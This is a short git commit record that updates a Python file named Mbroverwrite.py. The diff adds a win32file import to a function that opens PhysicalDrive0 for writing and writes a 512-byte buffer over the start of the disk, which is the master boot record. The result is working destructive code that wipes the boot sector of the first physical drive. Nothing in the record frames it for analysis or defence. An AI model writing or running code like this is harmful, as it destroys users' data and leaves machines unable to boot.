1f8f7981ce6567cd1f3e91b765d3520aee711233
0111011._ <88917025+0111011asdf@users.noreply.github.com>
2024-03-12 22:22:04 +0900

    Update Mbroverwrite.py

--- Mbroverwrite/Mbroverwrite.py
+++ Mbroverwrite/Mbroverwrite.py
@@ -1,3 +1,5 @@
+from win32file import *
+
 def mbr():
     hMBR = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE,   FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
     WriteFile(hMBR, AllocateReadBuffer(512), None)
